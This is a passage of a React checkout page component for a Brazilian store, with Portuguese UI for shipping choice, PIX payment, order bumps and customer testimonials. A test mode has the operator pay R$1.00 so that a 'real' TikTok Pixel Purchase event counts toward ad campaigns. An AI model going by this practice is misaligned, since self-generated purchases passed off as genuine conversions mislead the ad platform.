                          className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                            selectedShipping === "sedex"
                              ? "border-blue-500 bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          <label className="flex items-center justify-between cursor-pointer">
                            <div className="flex items-center gap-3">
                              <input
                                type="radio"
                                name="shipping"
                                value="sedex"
                                checked={selectedShipping === "sedex"}
                                onChange={(e) => setSelectedShipping(e.target.value)}
                                className="w-4 h-4 text-blue-600"
                              />
                              <div>
                                <div className="font-medium">
                                  {testMode ? "🧪 Teste Real - Opção 2" : "Correios (SEDEX)"}
                                </div>
                                <div className="text-sm text-gray-600">
                                  {testMode ? "Pagamento mínimo para teste" : "Em 3 dias úteis"}
                                </div>
                              </div>
                            </div>
                            <div className="font-bold text-lg">R$1,00</div>
                          </label>
                        </div>

                        <div
                          className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                            selectedShipping === "pac"
                              ? "border-blue-500 bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          <label className="flex items-center justify-between cursor-pointer">
                            <div className="flex items-center gap-3">
                              <input
                                type="radio"
                                name="shipping"
                                value="pac"
                                checked={selectedShipping === "pac"}
                                onChange={(e) => setSelectedShipping(e.target.value)}
                                className="w-4 h-4 text-blue-600"
                              />
                              <div>
                                <div className="font-medium">
                                  {testMode ? "🧪 Teste Real - Opção 3" : "Correios (PAC)"}
                                </div>
                                <div className="text-sm text-gray-600">
                                  {testMode ? "Pagamento mínimo para teste" : "Em 12 dias úteis"}
                                </div>
                              </div>
                            </div>
                            <div className="font-bold text-lg">R$1,00</div>
                          </label>
                        </div>
                      </div>
                      <p className="text-xs text-gray-500 mt-3">
                        {testMode
                          ? "🧪 Todas as opções geram o mesmo PIX de R$ 1,00 para teste real"
                          : "A previsão de entrega pode variar de acordo com a região e facilidade de acesso ao seu endereço"}
                      </p>
                    </div>
                  )}

                  {!showShippingOptions && (
                    <div className="bg-gray-50 p-4 rounded-lg">
                      <h3 className="font-medium mb-2">
                        {testMode ? "🧪 Preencha para continuar o teste" : "Escolha o melhor frete para você"}
                      </h3>
                      <p className="text-sm text-gray-600 mb-2">
                        {testMode
                          ? "Preencha seu CEP para continuar com o teste de R$ 1,00"
                          : "Preencha seu CEP para encontrar o melhor frete"}
                      </p>
                      <p className="text-xs text-gray-500">
                        {testMode
                          ? "Após preenchido, você poderá gerar o PIX de teste"
                          : "Após preenchido, encontraremos as melhores opções pra você"}
                      </p>
                    </div>
                  )}

                  <div className="flex gap-4 pt-4">
                    <Button
                      variant="outline"
                      onClick={() => setCurrentStep("identification")}
                      className="flex items-center gap-2"
                    >
                      ← Voltar
                    </Button>
                    <Button
                      className="flex-1 bg-teal-500 hover:bg-teal-600 text-white font-medium py-3"
                      onClick={() => setCurrentStep("payment")}
                      disabled={!showShippingOptions || !selectedShipping}
                    >
                      {testMode ? "IR PARA TESTE PIX R$ 1,00 →" : "IR PARA O PAGAMENTO →"}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {currentStep === "payment" && (
              <Card>
                <CardHeader>
                  <CardTitle className="text-xl">
                    {testMode ? "🧪 Teste Real - PIX R$ 1,00" : "Pagamento via PIX"}
                  </CardTitle>
                  <div className="flex items-center gap-2 text-sm text-green-600">
                    <Shield className="w-4 h-4" />
                    <span>Pagamento 100% seguro e criptografado</span>
                  </div>
                </CardHeader>
                <CardContent className="space-y-6">
                  {/* PIX Info */}
                  <div className="bg-gradient-to-r from-teal-50 to-blue-50 p-6 rounded-lg border border-teal-200">
                    <div className="flex items-start gap-4">
                      <div className="w-12 h-12 bg-teal-500 rounded-full flex items-center justify-center flex-shrink-0">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <g transform="translate(2, 4)">
                            <path d="M8 0L12 4L16 0L20 4L16 8L12 4L8 8L4 4L8 0Z" fill="white" />
                            <path d="M0 8L4 12L8 8L4 4L0 8Z" fill="white" />
                            <path d="M24 8L28 4L24 0L20 4L24 8Z" fill="white" />
                            <path d="M8 16L12 12L16 16L20 12L16 8L12 12L8 8L4 12L8 16Z" fill="white" />
                          </g>
                        </svg>
                      </div>
                      <div className="flex-1">
                        <h4 className="font-bold text-teal-800 mb-2 text-lg">
                          {testMode ? "🧪 Pagamento Teste Real PIX" : "Pagamento Instantâneo via PIX"}
                        </h4>
                        <p className="text-sm text-teal-700 mb-3">
                          {testMode
                            ? "Você pagará R$ 1,00 via PIX para gerar um evento Purchase REAL no TikTok Pixel."
                            : "Após finalizar o pedido, você receberá o código PIX e QR Code para pagamento instantâneo."}
                        </p>
                        <div className="bg-white/50 p-3 rounded-lg">
                          <div className="flex items-center gap-2 text-sm text-teal-800">
                            <Check className="w-4 h-4" />
                            <span>{testMode ? "Purchase real para campanhas" : "Aprovação instantânea"}</span>
                          </div>
                          <div className="flex items-center gap-2 text-sm text-teal-800 mt-1">
                            <Check className="w-4 h-4" />
                            <span>{testMode ? "Evento válido no TikTok" : "Disponível 24h por dia"}</span>
                          </div>
                          <div className="flex items-center gap-2 text-sm text-teal-800 mt-1">
                            <Check className="w-4 h-4" />
                            <span>{testMode ? "Valor mínimo R$ 1,00" : "Sem taxas adicionais"}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Order Bumps - Desabilitados no modo teste */}
                  {!testMode && (
                    <div className="mt-8">
                      <h3 className="text-lg font-medium mb-4 text-center">Produtos recomendados para você</h3>
                      <div className="space-y-3">
                        {orderBumps.map((bump) => (
                          <div
                            key={bump.id}
                            className={`border-2 border-dashed rounded-lg p-3 transition-all ${
                              selectedBumps.includes(bump.id)
                                ? "border-orange-400 bg-orange-50"
                                : "border-gray-300 hover:border-orange-300"
                            }`}
                          >
                            <div className="flex gap-3">
                              <input
                                type="checkbox"
                                checked={selectedBumps.includes(bump.id)}
                                onChange={(e) => {
                                  if (e.target.checked) {
                                    handleOrderBumpAdd(bump.id)
                                  } else {
                                    setSelectedBumps(selectedBumps.filter((id) => id !== bump.id))
                                  }
                                }}
                                className="mt-1 w-4 h-4"
                              />
                              <div className="w-16 h-16 bg-gray-100 rounded-lg flex items-center justify-center flex-shrink-0">
                                <Image
                                  src={bump.image || "/placeholder.svg?height=64&width=64"}
                                  alt={bump.title}
                                  width={64}
                                  height={64}
                                  className="w-full h-full object-cover rounded-lg"
                                />
                              </div>
                              <div className="flex-1 min-w-0">
                                <h4 className="font-medium text-sm leading-tight">{bump.title}</h4>
                                <p className="text-xs text-gray-600 mb-2 leading-tight">{bump.description}</p>
                                <div className="flex items-center justify-between">
                                  <span className="font-bold text-green-600 text-sm">{bump.price}</span>
                                  <Button
                                    size="sm"
                                    className="bg-orange-500 hover:bg-orange-600 text-white text-xs px-3 py-1 h-7"
                                    onClick={() => handleOrderBumpAdd(bump.id)}
                                  >
                                    ADICIONAR
                                  </Button>
                                </div>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Aviso modo teste */}
                  {testMode && (
                    <div className="bg-green-50 p-4 rounded-lg border border-green-200">
                      <h4 className="font-medium text-green-800 mb-2">🧪 Modo Teste Real Ativo</h4>
                      <div className="text-sm text-green-700 space-y-1">
                        <p>• Order bumps desabilitados para manter valor mínimo</p>
                        <p>• Você pagará apenas R$ 1,00 via PIX</p>
                        <p>• Taxa LiraPay: R$ 0,26 (26,4%) | Líquido: R$ 0,74</p>
                        <p>• Evento Purchase será REAL e válido para campanhas TikTok</p>
                        <p>• Perfeito para testar otimização de campanhas</p>
                      </div>
                    </div>
                  )}

                  {/* Security Footer */}
                  <div className="bg-gray-50 p-4 rounded-lg">
                    <div className="flex items-center justify-center gap-4 text-xs text-gray-600">
                      <div className="flex items-center gap-1">
                        <Shield className="w-3 h-3" />
                        <span>SSL 256 bits</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Check className="w-3 h-3" />
                        <span>Dados protegidos</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <svg className="w-3 h-3" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M8 0L12 4L16 0L20 4L16 8L12 4L8 8L4 4L8 0Z" />
                        </svg>
                        <span>PIX Seguro</span>
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-3 pt-4">
                    <Button
                      variant="outline"
                      onClick={() => setCurrentStep("delivery")}
                      className="flex items-center gap-2 h-12"
                    >
                      ← Voltar
                    </Button>
                    <Button
                      className={`flex-1 ${testMode ? "bg-green-600 hover:bg-green-700" : "bg-teal-500 hover:bg-teal-600"} text-white font-medium h-12 text-base`}
                      onClick={handleFinalizePurchase}
                      disabled={isProcessing}
                    >
                      {isProcessing ? "GERANDO PIX..." : testMode ? "GERAR PIX TESTE R$ 1,00 →" : "GERAR CÓDIGO PIX →"}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}
          </div>
        </div>

        {/* Testimonials Section - Unified */}
        <div className="mt-12">
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">Avaliações dos Clientes</CardTitle>
              <p className="text-sm text-gray-600">Veja o que nossos clientes estão dizendo</p>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Combine all testimonials */}
              {[...testimonials1, ...testimonials2].map((testimonial, index) => (
                <div key={index} className="flex gap-3 p-3 bg-gray-50 rounded-lg">
                  <div className="w-10 h-10 flex-shrink-0">
                    <Image
                      src={testimonial.avatar || "/placeholder.svg"}
                      alt={testimonial.name}
                      width={40}
                      height={40}
                      className={`w-full h-full object-cover ${testimonial.isOfficial ? "rounded-lg" : "rounded-full"}`}
                    />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="font-medium text-sm">{testimonial.name}</span>
                      {testimonial.isOfficial && (
                        <Badge variant="secondary" className="text-xs bg-blue-100 text-blue-800">
                          ✓ Verificado
                        </Badge>
                      )}
                    </div>
                    {testimonial.comment && <div className="text-xs text-gray-600 mb-2">"{testimonial.comment}"</div>}
                    <StarRating rating={testimonial.rating} />
                  </div>
                </div>
              ))}
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}
